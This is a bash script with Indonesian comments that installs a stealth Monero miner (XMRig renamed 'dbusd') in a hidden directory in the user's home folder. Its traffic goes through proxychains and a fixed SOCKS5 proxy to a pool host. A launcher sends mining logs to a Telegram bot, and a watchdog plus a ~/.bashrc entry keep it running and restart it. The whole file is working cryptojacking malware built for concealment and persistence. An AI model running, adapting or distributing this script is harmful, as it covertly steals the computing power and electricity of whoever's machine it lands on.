#!/bin/bash
set -e

# === KONFIGURASI ===
WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
REVERSE_DOMAIN="vheler.cfd"
REVERSE_PORT="9933"
WORKER="stealth-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 6)"
DIR="$HOME/.local/share/.syscache"

mkdir -p "$DIR" && cd "$DIR"

# === UNDUH XMRIG DAN GANTI NAMA ===
XMRIG_URL=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep browser_download_url | grep linux-static-x64.tar.gz | cut -d '"' -f 4)
curl -sLo miner.tar.gz "$XMRIG_URL"
tar -xzf miner.tar.gz --strip-components=1
rm -f miner.tar.gz
mv xmrig dbusd
chmod +x dbusd

# === KONFIGURASI XMRIG ===
cat > config.json <<EOF
{
  "autosave": true,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 50,
    "priority": 5
  },
  "pools": [{
    "url": "$REVERSE_DOMAIN:$REVERSE_PORT",
    "user": "$WALLET.$WORKER",
    "pass": "Genzo",
    "tls": true
  }]
}
EOF

# === UNDUH PROXYCHAINS ===
curl -sLo proxychains https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/proxychains
curl -sLo libproxychains.so.4 https://raw.githubusercontent.com/sagemantap/xmrig-antiban/main/libproxychains.so.4
chmod +x proxychains libproxychains.so.4

cat > proxychains.conf <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 116.100.220.220 1080
EOF

# === LAUNCHER DENGAN LOG TELEGRAM (HANYA ACCEPTED) ===
cat > launcher.sh <<'EOF'
#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
LOGDIR="$HOME/.local/share/.messenger/cache"
LOGFILE="$LOGDIR/logs.db"
FILTERED="$LOGDIR/accepted_only.log"
mkdir -p "$LOGDIR"

BOT_TOKEN="bot123456789:AAEij5m8cCExampleTokenReal"
CHAT_ID="123456789"

while true; do
  CPU_LOAD=$(top -bn1 | grep "Cpu(s)" | awk '{print 100 - $8}')
  CPU_INT=${CPU_LOAD%.*}
  if [ "$CPU_INT" -ge 95 ]; then
    echo "[*] CPU tinggi ($CPU_INT%), pause 30 detik..." >> "$LOGFILE"
    sleep 30
  else
    LD_PRELOAD="$DIR/libproxychains.so.4" \
    PROXYCHAINS_CONF_FILE="$DIR/proxychains.conf" \
    "$DIR/dbusd" --config="$DIR/config.json" >> "$LOGFILE" 2>&1
  fi

  grep "accepted" "$LOGFILE" > "$FILTERED" 2>/dev/null

  NOW=$(date +%s)
  LASTSEND_FILE="$LOGDIR/.lastsend"
  LAST=$(cat "$LASTSEND_FILE" 2>/dev/null || echo 0)
  DIFF=$((NOW - LAST))

  if [ "$DIFF" -ge 21600 ] && [ -s "$FILTERED" ]; then
    curl -s -F document=@"$FILTERED" \
      "https://api.telegram.org/$BOT_TOKEN/sendDocument?chat_id=$CHAT_ID&caption=Accepted%20Log%20$(date +%F_%T)"
    echo "$NOW" > "$LASTSEND_FILE"
    > "$FILTERED"
  fi
  sleep 5
done
EOF
chmod +x launcher.sh

# === WATCHDOG ===
cat > watchdog.sh <<'EOF'
#!/bin/bash
DIR="$(cd "$(dirname "$0")" && pwd)"
while true; do
  if ! pgrep -f "launcher.sh" >/dev/null; then
    nohup "$DIR/launcher.sh" >/dev/null 2>&1 &
  fi
  sleep 60
done
EOF
chmod +x watchdog.sh

# === AUTOSTART TANPA ROOT ===
if ! grep -q "watchdog.sh" ~/.bashrc; then
  echo "cd $DIR && nohup ./watchdog.sh >/dev/null 2>&1 &" >> ~/.bashrc
fi

# === JALANKAN ===
nohup ./launcher.sh >/dev/null 2>&1 &
nohup ./watchdog.sh >/dev/null 2>&1 &

echo "[✓] Stealth mining aktif + Log Telegram (accepted only)."
